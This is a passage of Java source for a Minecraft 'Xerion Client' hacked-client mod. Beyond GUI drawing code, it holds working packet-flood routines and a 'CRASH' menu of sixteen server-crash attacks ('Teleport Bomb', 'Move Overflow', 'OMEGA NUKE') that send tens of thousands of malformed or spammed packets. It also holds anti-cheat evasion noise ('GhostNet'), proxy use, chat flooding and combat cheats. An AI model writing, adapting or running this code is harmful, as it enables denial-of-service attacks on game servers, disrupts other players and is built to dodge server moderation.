            for(int e=0;e<14;e++){int ea=(int)((14-e)*dPulse*4.5f);if(ea>0){ctx.fill(bpx,bpy+e,bpx+PW,bpy+e+1,withA(DANGER,ea));ctx.fill(bpx,bpy+PH-e-1,bpx+PW,bpy+PH-e,withA(DANGER,ea));}}
            // Vertical red bars (left/right)
            for(int e=0;e<10;e++){int ea=(int)((10-e)*dPulse*5f);if(ea>0){ctx.fill(bpx+e,bpy,bpx+e+1,bpy+PH,withA(DANGER,ea));ctx.fill(bpx+PW-e-1,bpy,bpx+PW-e,bpy+PH,withA(DANGER,ea));}}
        }

        // ── Border — red when CRASH, ice otherwise ─────────────────────────
        int bA=(int)((0.9f+0.1f*glow)*255);
        float dPulse2=(float)(0.55+0.45*Math.sin(tick*0.06));
        int borderCol=(tab==3)?withA(DANGER,(int)(dPulse2*255)):BORDER;
        int outerCol =(tab==3)?withA(BLOOD,(int)(dPulse2*255)):BORDER;
        int ogA=(tab==3)?(int)(dPulse2*160):(int)(0.28f*glow*255*(1+hypeSmooth*.5f));
        if(ogA>0){ctx.fill(bpx-5,bpy-5,bpx+PW+5,bpy+1,withA(outerCol,ogA));ctx.fill(bpx-5,bpy+PH-1,bpx+PW+5,bpy+PH+5,withA(outerCol,ogA));ctx.fill(bpx-5,bpy-5,bpx+1,bpy+PH+5,withA(outerCol,ogA));ctx.fill(bpx+PW-1,bpy-5,bpx+PW+5,bpy+PH+5,withA(outerCol,ogA));}
        ctx.fill(bpx,     bpy,     bpx+PW,  bpy+5,    withA(borderCol,bA));
        ctx.fill(bpx,     bpy+PH-5,bpx+PW,  bpy+PH,   withA(borderCol,bA));
        ctx.fill(bpx,     bpy,     bpx+5,   bpy+PH,   withA(borderCol,bA));
        ctx.fill(bpx+PW-5,bpy,     bpx+PW,  bpy+PH,   withA(borderCol,bA));
        ctx.fill(bpx+5,bpy+5,bpx+PW-5,bpy+6,withA(tab==3?BLOOD:TITLE1,(int)(0.38f*255)));
        ctx.fill(bpx+5,bpy+PH-6,bpx+PW-5,bpy+PH-5,withA(tab==3?BLOOD:TITLE1,(int)(0.38f*255)));

        // Gold corners + crystal shards
        int gcA=(int)(0.95f*255); drawCorner(ctx,bpx,bpy,bpx+PW,bpy+PH,36,withA(GOLD,gcA));
        int csA=(int)(155+60*glow);
        drawShard(ctx,bpx+6,   bpy+6,    withA(CRYSTAL,csA));
        drawShard(ctx,bpx+PW-15,bpy+6,   withA(CRYSTAL,csA));
        drawShard(ctx,bpx+6,   bpy+PH-20,withA(CRYSTAL,csA));
        drawShard(ctx,bpx+PW-15,bpy+PH-20,withA(CRYSTAL,csA));

        // ── Title row ──────────────────────────────────────────────────────
        String t1="XERION",t2=" CLIENT";
        int tw1=textRenderer.getWidth(t1),tw2=textRenderer.getWidth(t2);
        int tx=cx2-(tw1+tw2)/2, ty=bpy+10;
        if(tab==3){
            // CRASH TAB: glitch title — blood red shadow + offset flicker
            float gf=(float)(Math.sin(tick*0.22)*2.5); int gi=(int)gf;
            int bloodA2=(int)(180+60*glow);
            for(int d=1;d<=4;d++){ctx.drawText(textRenderer,t1+t2,tx+gi+d,ty,withA(BLOOD,80/d),false);}
            ctx.drawText(textRenderer,t1,tx+gi,ty,withA(DANGER,bloodA2),false);
            ctx.drawText(textRenderer,t2,tx+tw1+gi,ty,withA(BLOOD,bloodA2),false);
            // "WARNING" badge left
            ctx.drawText(textRenderer,"☠ CRASH",bpx+8,bpy+9,withA(DANGER,(int)(160+80*glow)),false);
        } else {
            // Normal: rainbow hue shimmer on "XERION"
            float hr=hue; int shimmerCol=hsvToRgb(hr,0.5f,1f);
            int glA=(int)(60+45*glow); for(int d=-5;d<=5;d++){int g2=Math.max(0,glA-Math.abs(d)*9);if(g2>0){ctx.drawText(textRenderer,t1+t2,tx+d,ty,(g2<<24)|0x00CCFF,false);ctx.drawText(textRenderer,t1+t2,tx,ty+d,(g2<<24)|0x00CCFF,false);}}
            int tA=(int)(220+35*glow);
            ctx.drawText(textRenderer,t1,tx,ty,withA(shimmerCol,tA),false);
            ctx.drawText(textRenderer,t2,tx+tw1,ty,withA(TITLE2,tA),false);
        }
        // Version badge
        String ver="v1";
        int verCol=(tab==3)?withA(DANGER,(int)(180+60*glow)):withA(CRYSTAL,(int)(160+60*glow));
        ctx.drawText(textRenderer,ver,bpx+PW-textRenderer.getWidth(ver)-8,bpy+9,verCol,false);

        // Subtitle / player info
        String sub; int subCol=CRYSTAL;
        if(client!=null&&client.player!=null){
            var p=client.player;
            sub=String.format("X:%.0f  Y:%.0f  Z:%.0f  ❄  HP:%.0f  ❄  %s  ❄  PKT:%d",p.getX(),p.getY(),p.getZ(),p.getHealth(),XerionModules.sessionTimeStr(),XerionModules.totalPktsSent);
        } else {
            sub="❄  Xerion Client  ·  v1  ·  Fabric 1.21.1  ❄";
        }
        ctx.drawText(textRenderer,sub,cx2-textRenderer.getWidth(sub)/2,ty+12,withA(subCol,(int)(145+50*glow)),false);

        // Divider
        ctx.fill(bpx+28,bpy+TH-2,bpx+PW-28,bpy+TH-1,withA(BORDER2,100));

        // ── Tabs — colored backgrounds + glow ─────────────────────────────
        int tabW=(PW-14)/NT;
        for(int i=0;i<NT;i++){
            boolean active=(i==tab);
            int tabX=bpx+7+i*(tabW+1), tabY2=bpy+TH+5;
            int tc=TC[i];
            if(active){
                // Active: bright top bar + colored fill + bottom glow
                ctx.fill(tabX,   tabY2,tabX+tabW,tabY2+TABH,withA(tc,(int)(28+8*glow)));
                ctx.fill(tabX,   tabY2,tabX+tabW,tabY2+3,   withA(tc,(int)(200+50*glow)));
                ctx.fill(tabX+1, tabY2+3,tabX+tabW-1,tabY2+4, withA(tc,(int)(80+40*glow)));
                ctx.fill(tabX,tabY2+TABH-2,tabX+tabW,tabY2+TABH,withA(tc,(int)(100+70*glow)));
                ctx.fill(tabX,tabY2+TABH,tabX+tabW,tabY2+TABH+3,withA(tc,(int)(120+80*glow)));
                // Outer glow
                if((int)(20*glow)>0){ctx.fill(tabX-1,tabY2-1,tabX+tabW+1,tabY2,withA(tc,(int)(20*glow)));ctx.fill(tabX-1,tabY2,tabX,tabY2+TABH,withA(tc,(int)(10*glow)));ctx.fill(tabX+tabW,tabY2,tabX+tabW+1,tabY2+TABH,withA(tc,(int)(10*glow)));}
            } else {
                // Inactive: subtle tint + dim top line
                ctx.fill(tabX,tabY2,tabX+tabW,tabY2+TABH,withA(tc,6));
                ctx.fill(tabX,tabY2,tabX+tabW,tabY2+2,withA(tc,40));
            }
        }

        // ── VL meter ───────────────────────────────────────────────────────
        int vmX=bpx+8,vmY=bpy+PH-50,vmW=120,vmH=8;
        ctx.fill(vmX-1,vmY-1,vmX+vmW+1,vmY+vmH+1,withA(BORDER,(int)(80+40*glow)));
        ctx.fill(vmX,vmY,vmX+vmW,vmY+vmH,withA(0xFF010E1E,200));
        int vlFill=(int)(vmW*vlEstimate/100f);
        if(vlFill>0){
            int vlCol=vlEstimate<40?GREEN:vlEstimate<70?ORANGE:RED;
            ctx.fill(vmX,vmY,vmX+vlFill,vmY+vmH,withA(vlCol,(int)(180+40*glow)));
        }
        ctx.drawText(textRenderer,"VL:"+String.format("%.0f",vlEstimate),vmX+vmW+5,vmY,withA(TXT_ICE,160),false);

        // Background task indicator + progress bar
        {
            int bgX=bpx+PW-200, bgY=bpy+PH-52;
            if(!BackgroundTaskManager.isIdle()){
                int pulse=(int)(155+80*glow);
                // Dark backing
                ctx.fill(bgX-4,bgY-3,bgX+196,bgY+22,withA(0xFF001830,220));
                ctx.fill(bgX-4,bgY-3,bgX+196,bgY-2,withA(GREEN,pulse));
                ctx.fill(bgX-4,bgY+22,bgX+196,bgY+23,withA(GREEN,pulse/3));
                // Text
                ctx.drawText(textRenderer,"⚡ BG RUNNING — SAFE TO CLOSE",bgX,bgY,withA(GREEN,pulse),false);
                // Mini progress bar
                long total=BackgroundTaskManager.getPacketsTotal(),sent=BackgroundTaskManager.getPacketsSent();
                if(total>0){
                    int bw2=192, bh2=5;
                    ctx.fill(bgX,bgY+12,bgX+bw2,bgY+12+bh2,withA(0xFF002244,200));
                    int fill=(int)(bw2*(float)Math.min(sent,total)/total);
                    if(fill>0) ctx.fill(bgX,bgY+12,bgX+fill,bgY+12+bh2,withA(GREEN,pulse));
                    ctx.drawText(textRenderer,sent+"/"+total,bgX+bw2+3,bgY+12,withA(TXT_ICE,120),false);
                }
            } else if(!BackgroundTaskManager.getStatus().equals("Idle")){
                // Show last status briefly
                ctx.drawText(textRenderer,BackgroundTaskManager.getStatus(),bgX,bgY,withA(BackgroundTaskManager.getStatusColor(),120),false);
            }
        }

        // ── Status bar ─────────────────────────────────────────────────────
        int statusY=bpy+PH-34;
        ctx.fill(bpx+6,statusY-2,bpx+PW-6,statusY-1,withA(BORDER2,50));
        ctx.drawText(textRenderer,statusText,cx2-textRenderer.getWidth(statusText)/2,statusY,withA(statusColor,(int)(195+55*glow)),false);

        // Proxy status badge
        if(ProxyManager.isEnabled()&&ProxyManager.count()>0){
            String px2="PROXY ON  ["+ProxyManager.aliveCount()+"/"+ProxyManager.count()+"]";
            ctx.drawText(textRenderer,px2,bpx+PW-textRenderer.getWidth(px2)-10,statusY,withA(GREEN,(int)(165+55*glow)),false);
        }
        // Module status dots — always visible
        {
            int dotX=bpx+8, dotY=statusY; int dotStep=0;
            String[] mods={"AUTO-SWING","ANTI-AFK","NO-FALL","ANTI-KB"};
            boolean[] mOn={XerionModules.autoSwing,XerionModules.antiAfk,XerionModules.noFallAlways,XerionModules.antiKbAlways};
            int[] mCol={ORANGE,GREEN,CRYSTAL,PURPLE};
            for(int i=0;i<mods.length;i++){
                if(!mOn[i]) continue;
                String ml="▶ "+mods[i];
                ctx.fill(dotX-2,dotY-1,dotX+textRenderer.getWidth(ml)+2,dotY+9,withA(0xFF001830,180));
                ctx.drawText(textRenderer,ml,dotX,dotY,withA(mCol[i],(int)(180+60*glow)),false);
                dotX+=textRenderer.getWidth(ml)+8;
                dotStep++;
            }
        }

        super.render(ctx,mx,my,delta);
    }

    @Override public void mouseMoved(double mx, double my) {
        lastMx=(int)mx; lastMy=(int)my; super.mouseMoved(mx,my);
    }

    // ══ ACTIONS ══════════════════════════════════════════════════════════

    private int parseN(){try{return Math.max(1,Integer.parseInt(numField!=null?numField.getText():"100"));}catch(Exception e){return 100;}}
    private boolean np(){return client==null||client.player==null||client.getNetworkHandler()==null;}

    private void doFlood(){
        if(np())return;
        int n=unlimited?80000:parseN();
        double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();

        if(bgMode){
            // Background mode: submit to thread, GUI can close
            final int fn=n; final int fb=bypass; final boolean ft=timedMode;
            BackgroundTaskManager.setPacketProgress(0,fn);
            BackgroundTaskManager.submit("Packet Flood ×"+fn,()->{
                if(fb==10){
                    ProfessorClientMod.PACKETS_PER_TICK=100;
                    for(int i=0;i<fn&&!BackgroundTaskManager.shouldStop();i++){
                        ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i%32767));
                        if(i%200==0) ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,py2,pz,true));
                        if(i%5000==0) BackgroundTaskManager.setPacketProgress(i,fn);
                    }
                } else if(ft){
                    ProfessorClientMod.PACKETS_PER_TICK=4;
                    for(int i=0;i<fn&&!BackgroundTaskManager.shouldStop();i++)
                        ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(px+bypassX(i),py2+bypassDY(i),pz+bypassZ(i),bypassGround(i)));
                } else {
                    for(int i=0;i<fn&&!BackgroundTaskManager.shouldStop();i++){
                        try { if(client.getNetworkHandler()!=null) client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px+bypassX(i),py2+bypassDY(i),pz+bypassZ(i),bypassGround(i))); } catch(Exception ignored){}
                        if(i%3==0&&fb>0&&ProfessorClientMod.canSwing())
                            try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}catch(Exception ignored){}
                    }
                }
            });
            flash("⚡ Flood queued in BG  —  close GUI safely",GREEN);
        } else if(bypass==10){
            ProfessorClientMod.PACKETS_PER_TICK=100;
            for(int i=0;i<n;i++){ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i%32767));if(i%200==0)ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,py2,pz,true));}
            flash("❄ EXFIX: "+n+" pkts queued  ~"+(n/2000)+"s  VL≈0",TXT_ICE); addVl(n*0.01f);
        } else if(timedMode){
            ProfessorClientMod.PACKETS_PER_TICK=4;
            for(int i=0;i<n;i++) ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(px+bypassX(i),py2+bypassDY(i),pz+bypassZ(i),bypassGround(i)));
            flash("⏱ Timed flood: "+n+" pkts @80/sec",TXT_ICE); addVl(n*0.2f);
        } else {
            for(int i=0;i<n;i++){
                client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px+bypassX(i),py2+bypassDY(i),pz+bypassZ(i),bypassGround(i)));
                if(bypass>0&&i%3==0&&ProfessorClientMod.canSwing()) client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
            }
            flash("⚡ Sent "+n+" pkts ["+BP[bypass]+"]",TXT_ICE); addVl(n*0.2f);
        }
        triggerBurst();
    }

    private void doExploit(){
        if(np())return; int n=parseN(); final int et=exploitType;
        final double ex=client.player.getX(),ey=client.player.getY(),ez=client.player.getZ();
        BackgroundTaskManager.submit("Exploit["+et+"] ×"+n,()->{
            var nh=client.getNetworkHandler();
            switch(et){
                // ── 0: Swing Flood ────────────────────────────────────────
                case 0->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null)nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}catch(Exception g){}}
                // ── 1: Slot Spam ──────────────────────────────────────────
                case 1->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null)nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));}catch(Exception g){}}
                // ── 2: Teleport Ack Storm ─────────────────────────────────
                case 2->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null)nh.sendPacket(new TeleportConfirmC2SPacket(i%32767));}catch(Exception g){}}
                // ── 3: Move Flood (micro-variance) ────────────────────────
                case 3->{double[] xs=ghostNetX(n),zs=ghostNetZ(n);
                    for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++)
                        try{if(nh!=null)nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex+xs[i],ey,ez+zs[i],true));}catch(Exception g){}}
                // ── 4: Interact Flood (off-hand) ──────────────────────────
                case 4->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null)nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));}catch(Exception g){}}
                // ── 5: Sneak Toggle (rapid crouch) ───────────────────────
                case 5->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
                    try{if(nh!=null){
                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.PRESS_SHIFT_KEY));
                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex,ey,ez,true));
                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.RELEASE_SHIFT_KEY));
                    }}catch(Exception g){}}}
                // ── 6: Sprint Toggle ─────────────────────────────────────
                case 6->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
                    try{if(nh!=null){
                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.START_SPRINTING));
                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex+bypassX(i)*.5,ey,ez+bypassZ(i)*.5,true));
                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.STOP_SPRINTING));
                    }}catch(Exception g){}}}
                // ── 7: Dual-Hand Burst ────────────────────────────────────
                case 7->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
                    try{if(nh!=null){
                        nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                        nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));
                        if(i%4==0)nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
                    }}catch(Exception g){}}}
                // ── 8: Ground Flip ───────────────────────────────────────
                case 8->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
                    try{if(nh!=null){
                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex,ey,ez,i%2==0));
                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex,ey+(i%2==0?-0.0001:0.0001),ez,i%2!=0));
                    }}catch(Exception g){}}}
                // ── 9: Full Combo ────────────────────────────────────────
                case 9->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
                    try{if(nh!=null){
                        nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex+bypassX(i),ey+bypassDY(i),ez+bypassZ(i),bypassGround(i)));
                        if(i%3==0)nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
                        if(i%5==0)nh.sendPacket(new TeleportConfirmC2SPacket(i%32767));
                        if(i%7==0)nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));
                    }}catch(Exception g){}}}
                // ── 10: Look Spam (yaw/pitch rotation) ───────────────────
                case 10->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
                    try{if(nh!=null){
                        float yaw=(float)(i*13.7%360);float pitch=(float)(Math.sin(i*0.05)*30);
                        nh.sendPacket(new PlayerMoveC2SPacket.Full(ex,ey,ez,yaw,pitch,true));
                        if(i%3==0)nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                    }}catch(Exception g){}}}
                // ── 11: Position Jitter ───────────────────────────────────
                case 11->{double chaos=0.015;
                    for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
                        try{if(nh!=null){
                            double nx=ex+rng.nextGaussian()*chaos,nz=ez+rng.nextGaussian()*chaos;
                            double ny=ey+Math.abs(rng.nextGaussian())*0.003;
                            nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(nx,ny,nz,rng.nextBoolean()));
                            if(i%2==0)nh.sendPacket(new TeleportConfirmC2SPacket(i%32767));
                        }}catch(Exception g){}}}
                // ── 12: Slot Cycle All ───────────────────────────────────
                case 12->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
                    try{if(nh!=null){
                        nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
                        nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                        if(i%9==8)nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex,ey,ez,true));
                    }}catch(Exception g){}}}
                // ── 13: TeleMove Mix ─────────────────────────────────────
                case 13->{double[] gx=ghostNetX(n),gz=ghostNetZ(n);
                    for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
                        try{if(nh!=null){
                            nh.sendPacket(new TeleportConfirmC2SPacket(i%32767));
                            nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex+gx[i],ey,ez+gz[i],true));
                            if(i%5==0)nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                        }}catch(Exception g){}}}
            }
        });
        flash("⚡ Exploit["+et+"] BG ×"+n+" — GUI closeable",GREEN); addVl(n*0.05f); triggerBurst();
    }

    /** GhostNet X — looks like vanilla sub-block floating point noise */
    private double[] ghostNetX(int n){double[] a=new double[n];double acc=0;for(int i=0;i<n;i++){acc+=rng.nextGaussian()*0.00008;if(Math.abs(acc)>0.0002)acc*=0.5;a[i]=acc;}return a;}
    /** GhostNet Z — independent of X to avoid AC XZ correlation */
    private double[] ghostNetZ(int n){double[] a=new double[n];double acc=0;for(int i=0;i<n;i++){acc+=rng.nextGaussian()*0.00008;if(Math.abs(acc)>0.0002)acc*=0.5;a[i]=acc;}return a;}

    private void doCrash(){
        if(np())return; final int ct=crashType;
        final double cx3=client.player.getX(),cy3=client.player.getY(),cz3=client.player.getZ();
        BackgroundTaskManager.submit("CRASH["+ct+"]",()->{
            var nh=client.getNetworkHandler();
            switch(ct){
                // ── 0: Packet Storm — 100k move flood ─────────────────────
                case 0->{ for(int i=0;i<100000&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null)nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3,cy3+bypassDY(i),cz3,i%2==0));}catch(Exception g){} }
                // ── 1: Teleport Bomb — 50k random acks ───────────────────
                case 1->{ for(int i=0;i<50000&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null)nh.sendPacket(new TeleportConfirmC2SPacket(rng.nextInt(32767)));}catch(Exception g){} }
                // ── 2: Move Overflow — extreme coordinates ────────────────
                case 2->{ for(int i=0;i<50000&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null)nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                        cx3+rng.nextGaussian()*3e7, 1e8+rng.nextGaussian()*1e6, cz3+rng.nextGaussian()*3e7,false));}catch(Exception g){} }
                // ── 3: Chat Flood — 500 rapid messages ───────────────────
                case 3->{ for(int i=0;i<500&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null)nh.sendChatMessage("xerion"+i);}catch(Exception g){} }
                // ── 4: Swing Storm — 200k swings ─────────────────────────
                case 4->{ for(int i=0;i<200000&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null)nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}catch(Exception g){} }
                // ── 5: Slot Bomb — 100k slot spam ─────────────────────────
                case 5->{ for(int i=0;i<100000&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null)nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));}catch(Exception g){} }
                // ── 6: Ground Glitch — 80k ground flip ───────────────────
                case 6->{ for(int i=0;i<80000&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null){nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3,cy3,cz3,i%2==0));
                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3,cy3+(i%2==0?-0.0001:0.0001),cz3,i%2!=0));}}catch(Exception g){} }
                // ── 7: Full Combo Nuke — swing+move+slot+ack ─────────────
                case 7->{ for(int i=0;i<30000&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null){nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3+bypassX(i),cy3+bypassDY(i),cz3+bypassZ(i),bypassGround(i)));
                        if(i%3==0)nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
                        if(i%4==0)nh.sendPacket(new TeleportConfirmC2SPacket(i%32767));
                        if(i%6==0)nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));}}catch(Exception g){} }
                // ── 8: Sneak Bomb — 30k sneak cycle ──────────────────────
                case 8->{ for(int i=0;i<30000&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null&&client.player!=null){
                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.PRESS_SHIFT_KEY));
                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3,cy3,cz3,true));
                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.RELEASE_SHIFT_KEY));}}catch(Exception g){} }
                // ── 9: Sprint Storm — 30k sprint cycle ───────────────────
                case 9->{ for(int i=0;i<30000&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null&&client.player!=null){
                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.START_SPRINTING));
                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3+bypassX(i)*0.3,cy3,cz3+bypassZ(i)*0.3,true));
                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.STOP_SPRINTING));}}catch(Exception g){} }
                // ── 10: Look Nuke — extreme yaw/pitch ────────────────────
                case 10->{ for(int i=0;i<50000&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null){float yaw=(float)(rng.nextGaussian()*720);float pitch=(float)(rng.nextGaussian()*90);
                        nh.sendPacket(new PlayerMoveC2SPacket.Full(cx3,cy3,cz3,yaw,pitch,true));
                        if(i%5==0)nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}}catch(Exception g){} }
                // ── 11: Interact Bomb — 50k off-hand ─────────────────────
                case 11->{ for(int i=0;i<50000&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null)nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));}catch(Exception g){} }
                // ── 12: Teleport Mix — ack+move 60k ──────────────────────
                case 12->{ for(int i=0;i<60000&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null){nh.sendPacket(new TeleportConfirmC2SPacket(i%32767));
                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3+bypassX(i),cy3,cz3+bypassZ(i),true));
                        if(i%8==0)nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}}catch(Exception g){} }
                // ── 13: Dual Hand Nuke — both hands 100k ─────────────────
                case 13->{ for(int i=0;i<100000&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null){nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                        nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));
                        if(i%7==0)nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));}}catch(Exception g){} }
                // ── 14: Tick Overload — 10k full combo per tick ───────────
                case 14->{ for(int i=0;i<10000&&!BackgroundTaskManager.shouldStop();i++)
                    try{if(nh!=null&&client.player!=null){
                        nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                        nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));
                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3+bypassX(i),cy3+bypassDY(i),cz3+bypassZ(i),bypassGround(i)));
                        nh.sendPacket(new TeleportConfirmC2SPacket(i%32767));
                        nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
                        nh.sendPacket(new ClientCommandC2SPacket(client.player,i%2==0?ClientCommandC2SPacket.Mode.PRESS_SHIFT_KEY:ClientCommandC2SPacket.Mode.RELEASE_SHIFT_KEY));
                        nh.sendPacket(new ClientCommandC2SPacket(client.player,i%3==0?ClientCommandC2SPacket.Mode.START_SPRINTING:ClientCommandC2SPacket.Mode.STOP_SPRINTING));}}catch(Exception g){} }
                // ── 15: OMEGA NUKE — all types, full power ★★★ ───────────
                case 15->{ for(int wave=0;wave<5&&!BackgroundTaskManager.shouldStop();wave++){
                    for(int i=0;i<20000&&!BackgroundTaskManager.shouldStop();i++){
                        try{if(nh!=null&&client.player!=null){
                            nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                            nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));
                            nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3+rng.nextGaussian()*3e5,cy3+bypassDY(i),cz3+rng.nextGaussian()*3e5,rng.nextBoolean()));
                            nh.sendPacket(new TeleportConfirmC2SPacket(rng.nextInt(32767)));
                            nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
                            if(i%2==0)nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.PRESS_SHIFT_KEY));
                            if(i%3==0)nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.START_SPRINTING));
                            if(i%5==0){float y=(float)(rng.nextGaussian()*360);float p=(float)(rng.nextGaussian()*90);nh.sendPacket(new PlayerMoveC2SPacket.Full(cx3,cy3,cz3,y,p,rng.nextBoolean()));}
                        }}catch(Exception g){}
                    }
                }}
            }
        });
        String[] msgs={"☠ Storm queued","☠ Bomb armed","☠ Overflow live","☠ Flood start","☠ Swing nuke","☠ Slot bomb","☠ Glitch run","☠ Combo nuke","☠ Sneak storm","☠ Sprint storm","☠ Look nuke","☠ Interact bomb","☠ Tele-mix","☠ Dual nuke","☠ Tick overload","☠☠☠ OMEGA NUKE ARMED"};
        flash(msgs[Math.min(ct,msgs.length-1)]+" — close GUI safely",DANGER); addVl(100f); triggerBurst();
    }

    private void combatHit(){if(np())return;for(int i=0;i<200*burst;i++){if(ProfessorClientMod.canSwing())client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}flash("⚔ Hit Spam ×"+(200*burst),ORANGE);addVl(25f);}
    private void combatCrit(){if(np())return;double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();for(int i=0;i<burst*2;i++){client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,py2+0.42,pz,false));client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,py2,pz,true));if(ProfessorClientMod.canSwing())client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}flash("⚔ Crit ×"+burst*2,ORANGE);addVl(5f);}
